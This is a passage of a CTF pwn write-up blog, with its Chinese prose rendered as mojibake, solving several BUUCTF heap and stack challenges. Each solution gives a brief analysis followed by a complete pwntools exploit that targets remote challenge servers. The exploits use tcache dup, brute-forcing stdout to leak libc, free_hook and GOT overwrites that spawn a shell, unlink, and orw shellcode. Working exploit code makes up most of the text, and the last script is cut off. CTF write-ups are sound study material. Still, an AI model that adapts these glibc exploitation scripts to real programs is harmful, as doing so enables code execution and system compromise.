ç§ä¸åŒçš„æƒ…å†µ</p><ul><li>1.å½“sizeä¸º0ï¼Œè¿™æ—¶å°±ç›¸å½“äºfree()å‡½æ•°ï¼ŒåŒæ—¶è¿”å›å€¼ä¸ºnull</li><li>2.å½“æŒ‡é’ˆä¸º0ï¼Œsizeå¤§äº0ï¼Œç›¸å½“äºmallocå‡½æ•°</li><li>3.sizeå°äºç­‰äºåŸæ¥çš„sizeï¼Œåˆ™åœ¨åŸå…ˆçš„åŸºç¡€ä¸Šç¼©å°ï¼Œå¤šä½™çš„å †å—freeæ‰</li><li>4.sizeå¤§äºåŸæ¥çš„sizeï¼Œå¦‚æœ<strong>æœ‰è¶³å¤Ÿç©ºé—´</strong>å°±åŸåŸºç¡€æ‰©å……ï¼Œç©ºé—´ä¸è¶³åˆ™åˆ†é…æ–°çš„å†…å­˜ï¼Œå¹¶å°†åŸæ¥æŒ‡é’ˆæŒ‡å‘çš„å †å—æ—§å†…å®¹å¤åˆ¶åˆ°æ–°çš„å †å—å†…å­˜ä¸­ï¼Œç„¶åå†å°†åŸæ¥çš„å †å—freeæ‰ã€‚</li></ul><p>å…¶ä¸­ç¬¬4ç‚¹ï¼Œæœ‰è¶³å¤Ÿç©ºé—´ï¼Œç”»å›¾è§£é‡Šä¸€ä¸‹ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/uqru5B.png" srcset="/img/loading.gif" alt></p><p>ç”±äºè¿™ä¸ªç‰¹æ€§ï¼Œæ¥åˆ¶ä½œ3ä¸ªå †å—Aã€Bã€Cï¼ŒBå †å—ä½œä¸ºè¿›å…¥unsortbinçš„å †å—å­˜åœ¨ï¼ŒCæ˜¯ä¸ºäº†é˜²æ­¢ä¸è®©Cåˆå¹¶top chunkï¼Œç„¶åç”¨Aæ¥ç”³è¯·ä¸€ä¸ªsize&lt;=ï¼ˆAçš„size + Bçš„sizeï¼‰çš„å †å—ï¼Œè¿™æ ·å°±é€ æˆäº†å †å—çš„é‡å ã€‚</p><h4 id="åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯"><a href="#åˆ©ç”¨-IO-2-1-stdout-æ¥æ³„æ¼ä¿¡æ¯" class="headerlink" title="åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯"></a><code>åˆ©ç”¨ _IO_2_1_stdout_ æ¥æ³„æ¼ä¿¡æ¯</code></h4><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="http://pzhxbz.cn/?p=139" target="_blank" rel="noopener">http://pzhxbz.cn/?p=139</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p><a href="http://blog.eonew.cn/archives/1190" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1190</a></p><p>è¿™ä¸ªé¢˜å› ä¸ºæœ‰è¿‡è¾“å‡ºï¼Œå…¶<code>_IO_CURRENTLY_PUTTING</code>å°±æ˜¯ä¸º1çš„ ï¼Œå¯¹äº<code>_IO_IS_APPENDING</code>è¿™ä¸ªflagçš„å€¼ï¼Œå°†è¿™ä¸ªflagææˆ1ä¹‹åï¼Œå°±å¯ä»¥é€šè¿‡ä¿®æ”¹<code>_IO_buf_base</code>æ¥å®Œæˆleakã€‚</p><p>åœ¨èµ›é¢˜ä¸­ï¼Œå¾ˆå¤šç¨‹åºéƒ½æ˜¯ç”¨è¿‡è¾“å‡ºå‡½æ•°è¿›è¡Œè¾“å‡ºçš„ï¼ŒåŸºæœ¬å°±æ˜¯æ”¹æ‰flagï¼Œä¸­é—´çš„ä¸‰ä¸ªå˜é‡åœ¨è¾“å‡ºçš„è¿‡ç¨‹ä¸­éƒ½ä¸æ€ä¹ˆç”¨å¾—åˆ°ï¼Œç›´æ¥ç›–æˆ0,ä½ä½è¦†ç›–<code>_IO_buf_base</code>ä¸ºåˆé€‚çš„å€¼å°±å¯ä»¥å®Œæˆleakã€‚</p><p>Flag æ€ä¹ˆè®¾ç½®ï¼Œåœ¨èµ›é¢˜ä¸­è¿˜æ˜¯å¾ˆéšæ„çš„ï¼š</p><pre><code>0xfbad18870xfbad3c80</code></pre><p>é‡ç‚¹å°±æ˜¯è®©<code>stdout-&gt;_IO_read_end == stdout-&gt;_IO_write_base</code></p><p>å¤§ä½“çš„åˆ©ç”¨æ–¹æ³•å°±æ˜¯åˆ©ç”¨unsorted binçš„åœ¨tcacheæˆ–fastbinçš„fdä¸Šç•™ä¸‹<code>main_arena</code>çš„åœ°å€ï¼Œç”±äº<code>_IO_2_1_stdout_</code>ä¸<code>arena</code>åªç›¸å·®4ä½ï¼Œä¸”ä½ä¸‰ä½å·²çŸ¥ï¼Œåœ¨ä¼ å…¥æ˜¯ä½3ä½è¦†ç›–fdç•™ä¸‹çš„<code>main_arena</code>çš„åœ°å€ï¼Œå‰©ä½™ä¸€ä½å¯ä»¥çˆ†ç ´ï¼Œæ¦‚ç‡1/16,ä»è€ŒåŠ«æŒstdoutä»¥è¾¾åˆ°æ³„éœ²çš„ç›®çš„ ã€‚</p><h2 id="exp-21"><a href="#exp-21" class="headerlink" title="exp"></a>exp</h2><pre><code class="python">from pwn import *import timelocal_file  = &#39;./roarctf_2019_realloc_magic&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,28690)    libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]rce18 = [0x4f2c5,0x4f322,0x10a38c]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;?&#39;,str(size))    if int(size) != 0 :        sa(&#39;?&#39;,str(data))def free():    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)def leak_addr():    add(0x80,&#39;aaaaaaa&#39;)    add(0,&#39;&#39;)    add(0x100,&#39;aaaaaaaa&#39;)    add(0,&#39; &#39;)    add(0x110,&#39; &#39;)    add(0,&#39;&#39;)    add(0x100,&#39;a&#39;)    for i in range(7):        free()    add(0,&#39;1&#39;)    add(0x80,&#39;\x60\x87&#39;)    payload = 17 * p64(0) + p64(0x61) + &#39;\x60\x87&#39;    add(0x190,payload)    add(0,&#39;&#39;)    add(0x100,&#39;\x60\x87&#39;)    add(0,&#39;&#39;)    payload = p64(0xfbad3c80) + &#39;\x00&#39; * 8 * 3 + &#39;\x00&#39;    add(0x100,payload)leak = 0while True:    try:        leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&#39;&#39;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&#39;&#39;)        break    except Exception:        io.close()        # io = process(&#39;./roarctf_2019_realloc_magic&#39;)        io = remote(&#39;node3.buuoj.cn&#39;,28690)        continueleak = leak &gt;&gt; 16info_addr(&#39;leak&#39;,leak)libc_base = leak - 4110208info_addr(&#39;libc_base&#39;,libc_base)free_hook = 4118760 + libc_basesys_addr = 324832+libc_basesla(&#39;&gt;&gt;&#39;,&#39;666&#39;)add(0x120,&#39;aaaaaaa&#39;)add(0,&#39;&#39;)add(0x130,&#39;aaaaaaaa&#39;)add(0,&#39; &#39;)add(0x160,&#39; &#39;)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)for i in range(7):    free()add(0,&#39;1&#39;)add(0x120,&#39;\x60\x87&#39;)payload = 37 * p64(0) + p64(0x71) + p64(free_hook)add(0x260,payload)add(0,&#39;&#39;)add(0x130,&#39;a&#39;)add(0,&#39;&#39;)one_rec = rce18[1] +libc_baseadd(0x130,p64(one_rec))free()# debug()itr()</code></pre><p>å…¶ä¸­expçš„çˆ†ç ´stdoutéƒ¨åˆ†ï¼Œå¯ä»¥å½“ä½œæ¨¡ç‰ˆä½¿ç”¨ï¼Œæ¥è‡ªpzhxbzå¤§ä½¬çš„ã€‚</p><h2 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a><code>ciscn_2019_en_3</code></h2><h3 id="åˆ†æ-20"><a href="#åˆ†æ-20" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>å¸¸è§„å †é¢˜ï¼ŒUAFï¼Œdupæ‰“<code>free_hook_</code>ã€‚ä¸Šæ¥ç”¨<code>puts(&amp;s)</code>ï¼Œæ¥æ³„æ¼æ ˆä¸Šå­˜åœ¨çš„libcåœ°å€ã€‚</p><h3 id="exp-22"><a href="#exp-22" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_2019_en_3&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29542)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;ice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;story&#39;,str(data))def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))payload = &#39;a&#39; * (0x20-8)sa(&#39;name&#39;,payload)sa(&#39;ID&#39;,&#39;chumen77&#39;)ru(&#39;chumen77&#39;)libc_base = uu64(r(6)) - 0x81237info_addr(&#39;libc_base&#39;,libc_base)add(0x50,&#39;aaaaaaaa&#39;)free(0)free(0)free_hook = libc_base + 0x3ed8e8add(0x50,p64(free_hook))add(0x50,p64(free_hook))rec = rce18[1] + libc_baseadd(0x50,p64(rec))free(0)itr()</code></pre><h2 id="æå®¢å¤§æŒ‘æˆ˜2019-Not-bad"><a href="#æå®¢å¤§æŒ‘æˆ˜2019-Not-bad" class="headerlink" title="æå®¢å¤§æŒ‘æˆ˜2019 Not bad"></a>æå®¢å¤§æŒ‘æˆ˜2019 Not bad</h2><h3 id="åˆ†æ-21"><a href="#åˆ†æ-21" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æº¢å‡º0x18ä¸ªå­—èŠ‚ï¼ŒåŠ ä¸Šæœ¬èº«çš„æ ˆé•¿åº¦ï¼Œè¯»orw çš„shellcodeå†…å­˜ä¸æ˜¯å¾ˆå¤Ÿç”¨ã€‚éœ€è¦è¿ç§»åˆ°mmapï¼Œè¿›è¡Œorwã€‚æ‰€ä»¥æ‘†åœ¨æ ˆä¸Šçš„shellcodeå°±æ˜¯ï¼Œæ¥ä¸€ä¸ªreadå‡½æ•°ï¼ŒæŠŠorwæ”¾åœ¨mmapä¸Šï¼Œç„¶åå†è·³è½¬ä¸Šå»æ‰§è¡Œå³å¯ã€‚å¹¶ä¸”å†æ¬¡ç”¨åˆ° <code>jmp rsp</code> + shellcode.</p><h3 id="exp-23"><a href="#exp-23" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bad&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29794)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()mmap = 0x123000jmp_rsp = 0x0000000000400a01# bss = 0x6010B0 - 0x20orw = asm(shellcraft.open(&quot;./flag&quot;))orw += asm(shellcraft.read(3,&quot;rsp&quot;,0x30))orw += asm(shellcraft.write(1,&quot;rsp&quot;,0x30))payload = asm(shellcraft.read(0,mmap + 0x300,0x100)) + asm(&#39;mov rax,0x123300;call rax&#39;)payload = payload.ljust(0x28,&#39;a&#39;)payload += p64(jmp_rsp) +   asm(&#39;sub rsp,0x30;jmp rsp&#39;)sa(&#39;fun&#39;,payload)s(orw)itr()</code></pre><h2 id="ciscn-2019-final-5"><a href="#ciscn-2019-final-5" class="headerlink" title="ciscn_2019_final_5"></a><code>ciscn_2019_final_5</code></h2><h3 id="åˆ†æ-22"><a href="#åˆ†æ-22" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>ä¿æŠ¤å¼€çš„ä¸å¤šï¼Œåˆ†æå’Œåˆ©ç”¨èµ·æ¥ç®€å•ä¸å°‘ã€‚</p><p>è¿™ä¸ªé¢˜éš¾ç‚¹å°±æ˜¯åœ¨äºå‘ç°æ¼æ´ç‚¹ã€‚</p><h4 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h4><pre><code class="c"> __int64 result; // rax  signed int i; // [rsp+4h] [rbp-1Ch]  int size; // [rsp+8h] [rbp-18h]  int idx; // [rsp+Ch] [rbp-14h]  void *buf; // [rsp+10h] [rbp-10h]  __int64 v5; // [rsp+18h] [rbp-8h] printf(&quot;index: &quot;);  idx = read_int();  if ( idx &lt; 0 || idx &gt; 16 )  {    puts(&quot;index is invalid.&quot;);    exit(-1);  }  printf(&quot;size: &quot;);  size = read_int();  if ( size &lt; 0 || size &gt; 0x1000 )  {    puts(&quot;size is invalid.&quot;);    exit(-1);  }  buf = malloc(size);  if ( !buf )  {    puts(&quot;malloc error.&quot;);    exit(-1);  }  printf(&quot;content: &quot;);  read(0, buf, size);  show_diy((__int16)buf);</code></pre><p>å¯ä»¥è‡ªå®šä¹‰è¾“å…¥å †çš„ç¼–å·ï¼Œæœ€å¤§å¯ä»¥17ä¸ªï¼Œå°±æ„Ÿè§‰æœ‰ç‚¹å¥‡æ€ªã€‚ç„¶åä»¥æ ˆä¸Šçš„ä¸€ä¸ªbufæ¥å­˜å–åˆ†é…heapçš„åœ°å€ã€‚</p><pre><code class="c">result = sub_400AB0((__int64)buf, idx);  v5 = result;  for ( i = 0; i &lt;= 16; ++i )  {    result = heaplist_idx[i];    if ( !result )    {      heaplist_idx[i] = v5;      result = i;      sizelist[i] = size;      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall sub_400AB0(__int64 a1, int a2){  return a1 | a2;}</code></pre><p>å¯ä»¥çœ‹åˆ°ä»¥å †åœ°å€ä¸å †çš„idè¿›è¡Œä»¥æ¥ä¸€ä¸ª<code>|</code> è¿ç®—ã€‚ç„¶åè¿”å›å›æ¥ç»™v5ï¼Œç„¶ååœ¨å­˜å…¥bssçš„ä¸€æ®µåœ°å€ä¸­ã€‚ç®—æ˜¯å¤„ç†è¿‡çš„å †åœ°å€ã€‚</p><p>å°è¯•ç ”ç©¶ä¸€ä¸‹ï¼Œåšå®Œå¤„ç†æ˜¯ä»€ä¹ˆæ ·å­ï¼š</p><p>å…ˆåˆ†é…ä¸€ä¸ªå †å·ä¸º1 å’Œ 16çš„å †å—ï¼Œçœ‹ä¸‹bssé‡Œé¢æ˜¯å­˜å…¥äº†ä»€ä¹ˆã€‚</p><pre><code>x/30gx  0x6020E00x6020e0:       0x0000000000e35270(16)      0x0000000000e35281(0)</code></pre><pre><code>In [2]: hex(0x0e35260 | 16)Out[2]: &#39;0xe35270&#39;In [3]: hex(0x00e35281 | 0)Out[3]: &#39;0xe35281&#39;</code></pre><p>å·®ä¸å¤šå°±æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥å‘ç°ç‚¹å¼‚æ ·ã€‚å› ä¸ºæ˜¯<code>|</code> çš„é€»è¾‘è¿ç®—ï¼Œåœ¨<code>0-0xf</code>æ˜¯ä¸€ä¸ªè½®å›åï¼Œåˆ°äº†16å°±åˆç®—æ˜¯ä¸€ä¸ªè½®å›ã€‚<br>æ—¢ç„¶å¤„ç†è¿‡å †åœ°å€ï¼Œé‚£è‚¯å®šå–å‡ºæ¥è¿›è¡Œæ“ä½œæ—¶ï¼Œè‚¯å®šè¿˜ä¼šå†è¿›è¡Œå¤„ç†å›æ¥ã€‚ä¸‹é¢å°±æ˜¯æ³¨æ„æ€ä¹ˆå¤„ç†çš„ã€‚</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><pre><code class="c"> for ( i = 0; i &lt;= 16; ++i )  {    result = get_idx(heaplist_idx[i]);    if ( result == idx )    {      printf(&quot;content: &quot;);      read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);      result = puts(&quot;edit success.\n&quot;);      break;    }  }</code></pre><pre><code class="c">__int64 __fastcall get_idx(char a1){  return a1 &amp; 0xF;}</code></pre><p>å¯ä»¥çœ‹åˆ°å…¶æ˜¯ä¾æ¬¡0-17ç¼–å·å¯¹å †å—è¿›è¡Œéå†å–å‡ºï¼Œå†å–å‡ºæ—¶ä¼šå¯¹å…¶è¿›è¡Œ<code>&amp; 0xf</code>çš„æ“ä½œæ¥å°è¯•è·å–å †å—çš„ç¼–å·ã€‚</p><p>æ¥æµ‹è¯•ä¸€ä¸‹ï¼š</p><pre><code class="c">In [5]: hex(0x00e35281 &amp; 0xf). #1å·å †å—çš„è®¡ç®—Out[5]: &#39;0x1&#39;In [6]: hex(0x00e35270 &amp; 0xf) #16å·å †å—çš„è®¡ç®—Out[6]: &#39;0x0&#39;</code></pre><p>è¿™å°±å¾ˆæ˜æ˜¾æœ‰å¼‚æ ·äº†ï¼Œç”³è¯·çš„æ˜¯16å·å †å—å…¶è®¤ä¸ºæ˜¯0å·å †å—ã€‚æ‰€ä»¥ç”³è¯·16å·çš„å †å—ï¼Œå…¶å¯ä»¥ç”¨editï¼ˆ0ï¼‰æ¥è¿›è¡Œç¼–è¾‘16å·å †å—ã€‚</p><p>ç„¶åçœ‹å…¶å¦‚ä½•ç¼–è¾‘çš„ï¼š</p><pre><code class="c">  read_diy((void *)(heaplist_idx[i] &amp; 0xFFFFFFFFFFFFFFF0LL), sizelist[i]);</code></pre><p>å…¶æ˜¯æ ¹æ®bssä¸Šå­˜çš„å¤„ç†è¿‡å †å—åœ°å€è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code> æ¥è¿›è¡Œç¼–è¾‘çš„ã€‚<br>å¯¹äºä¸Šæ¥å°±ç”³è¯·äº†ä¸€ä¸ª16å·çš„å †å—ï¼Œå¾ˆå®¹æ˜“çŸ¥é“å…¶å †å—çš„æœ«3ä¸ºåº”è¯¥æ˜¯0x260ï¼Œä½†æ˜¯å½“æ—¶å­˜å…¥çš„æ˜¯0x270ï¼Œå°è¯•è¿›è¡Œä¸€ä¸‹<code>&amp; 0xFFFFFFFFFFFFFFF0</code>ï¼š</p><pre><code>In [7]: hex(0x00e35270 &amp; 0xFFFFFFFFFFFFFFF0)Out[7]: &#39;0xe35270&#39;</code></pre><p>å‘ç°å¹¶ä¸æ˜¯ä»0x260è¿›è¡Œç¼–è¾‘ï¼Œä½†æ˜¯åŒæ ·è¿˜æ˜¯å¯ä»¥ç¼–è¾‘åŒæ ·çš„sizeï¼Œæ‰€ä»¥è¿™å°±é€ æˆäº†æº¢å‡ºï¼Œå¹¶ä¸”æ˜¯0x10ä¸ªå­—èŠ‚ã€‚</p><h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>é‡Šæ”¾2ä¸ªtcache å †å—ï¼Œå¹¶ä¸”åˆ©ç”¨0x10å­—èŠ‚ï¼Œæ”¹å…¶ä¸­ä¸€ä¸ªå †å—çš„fdï¼Œæ”¹ä¸ºfreeçš„gotä½ç½®</li><li>ç”³è¯·å †å—åˆ°free gotå¤„ï¼Œæ”¹free ä¸º puts</li><li>æ„é€ å‡ºä¸€ä¸ªunsortbinçš„å †å—ï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ªå †å—ï¼Œå°±ä¼šåœ¨è¿™ä¸ªå †å—ä¸Šç•™ä¸‹éƒ¨åˆ†çš„libcåœ°å€ï¼Œç„¶åè¿›è¡Œleak</li><li>ç®—å‡ºsystemçš„åœ°å€ï¼Œç»§ç»­æ”¹free got å¤„ä¸º systemï¼Œç„¶åfreeä¸€ä¸ªå¸¦æœ‰<code>/bin/sh\x00</code>çš„å †å—ï¼Œå³å¯æ‹¿åˆ°shell</li></ul><h3 id="exp-24"><a href="#exp-24" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./ciscn_final_5&#39;elf = ELF(local_file)# context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,27180)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;choice:&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;choice:&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;choice:&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))add(16,0x18,&#39;sasdasdas&#39;)add(1,0x30,&#39;aaaaaaaa&#39;)add(2,0x30,&#39;aaaaaaaa&#39;)free(2)free(1)edit(0,p64(0) + p64(0x121) + p64(0x000000000602010))add(5,0x800,&#39;aaaaaaaa&#39;)add(6,0x50,&#39;aaaa&#39;)add(3,0x30,&#39; &#39;)free(5)add(7,0x90,&#39; &#39;)add(4,0x30,&#39;aaaaaaaa&#39; + p64(elf.plt[&#39;puts&#39;]))free(7)r()libc_base = uu64(r(6)) - 0x3ec120info_addr(&#39;libc_base&#39;,libc_base)edit(4,&#39;aaaaaaaa&#39; + p64(libc.sym[&#39;system&#39;] + libc_base))add(9,0x10,&#39;/bin/sh\x00&#39;)free(9)itr()</code></pre><p>ç”±äºå…¶ç¡®å®šå †å—çš„ç‰¹æ®Šæ€§ï¼Œåœ¨ç”³è¯·å †å—åˆ°free gotæ—¶ï¼Œå› ä¸ºå…¶åœ¨<code>0x000000000602018</code>ï¼Œä½†æ˜¯åœ¨ç»è¿‡é€»è¾‘è¿ç®—å¤„ç†åï¼Œæ”¾å…¥bssåï¼Œæƒ³è¦å†è¿›è¡Œæ“ä½œå°±æœ‰ç‚¹å›°éš¾ï¼Œæ‰€ä»¥ç”³è¯·åˆ°<code>0x000000000602010</code> å°±OKäº†ã€‚</p><h2 id="ciscn-2019-s-1"><a href="#ciscn-2019-s-1" class="headerlink" title="ciscn_2019_s_1"></a><code>ciscn_2019_s_1</code></h2><h3 id="åˆ†æ-23"><a href="#åˆ†æ-23" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤ï¼š</p><pre><code>[*] &#39;/ctf/work/buuctf/shuati/ciscn_2019_s_1/ciscn_s_1&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>Addå‡½æ•°ï¼šæœ€å¤šå¯ä»¥ç”³è¯·33ä¸ªå †ï¼Œä¸”é—®ä½ å †çš„ç¼–å·ï¼Œå¹¶ä¸”æ ¹æ®è¿™ä¸ªç¼–å·ä½œä¸ºç´¢å¼•ä¸Šbssæ®µæ¥å­˜å‚¨heapçš„åœ°å€ã€‚å¤§å°èŒƒå›´åœ¨<code>0x7f - 0x100</code>ã€‚</p><p>editå‡½æ•°ï¼š</p><pre><code class="c">v0[read(0, (void *)heap[v2], (signed int)len[v2])] = 0;</code></pre><p>æ˜æ˜¾å­˜åœ¨ç€off by nullã€‚ä¸”æœ‰key1æ§åˆ¶ç€ï¼Œåªèƒ½ç¼–è¾‘2æ¬¡ã€‚</p><pre><code class="c">if ( key1 == 2 )    exit(0);</code></pre><p>Showå‡½æ•°ï¼š<br>Key2æœ‰å€¼æ‰èƒ½ç”¨ã€‚</p><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”±äºæ²¡æœ‰å¼€å¯pieä¿æŠ¤ï¼Œè¿™æ ·æ˜æ˜¾å¯ä»¥unlinkæ”»å‡»ï¼Œç”³è¯·ä¸€ä¸ª32å †å·çš„å †ï¼Œå¤§å°0xf8ï¼Œéƒ½æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œä¸ºäº†ä¸Šé è¿‘key1ã€key2ï¼Œç„¶åè¿›è¡Œæ§åˆ¶.</li></ul><p>å‰©ä¸‹çš„å°±å¾ˆç®€å•äº†ã€‚</p><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *import timelocal_file  = &#39;./ciscn_s_1&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,29756)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;show\n&#39;,&#39;1&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sa(&#39;content&#39;,str(data))def free(idx):    sla(&#39;show\n&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;show\n&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;content&#39;,str(data))def show(idx):    sla(&#39;show\n&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))key2 = 0x6022B8for i in range(7):    add(i,0xf8,&#39;aaaaaaaa&#39;)add(7,0xf8,&quot;aaaa&quot;)#8payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + 